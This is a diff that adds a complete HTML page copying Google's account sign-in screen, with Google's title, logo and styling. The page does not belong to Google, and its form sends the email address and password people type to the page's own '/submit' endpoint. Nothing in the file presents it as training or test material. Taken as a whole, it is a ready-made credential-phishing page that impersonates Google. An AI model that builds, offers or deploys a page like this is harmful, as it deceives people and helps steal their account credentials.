@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in – Google Accounts</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background-color: #f2f2f2;
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 360px;
+            margin: 80px auto;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            padding: 40px;
+        }
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 75px;
+        }
+        h2 {
+            font-weight: normal;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1a73e8;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #1558b0;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+        }
+        .links {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .links a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
+        </div>
+        <h2>Sign in</h2>
+        <p>Use your Google Account</p>
+        <form action="/submit" method="POST">
+            <input type="email" name="email" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <button class="button" type="submit">Next</button>
+        </form>
+        <div class="links">
+            <a href="#">Forgot email?</a> · 
+            <a href="#">Learn more</a>
+        </div>
+        <div class="footer">
+            Not your computer? Use Guest mode to sign in privately. <br>
+            <a href="#">Learn more</a>
+        </div>
+    </div>
+</body>
+</html>
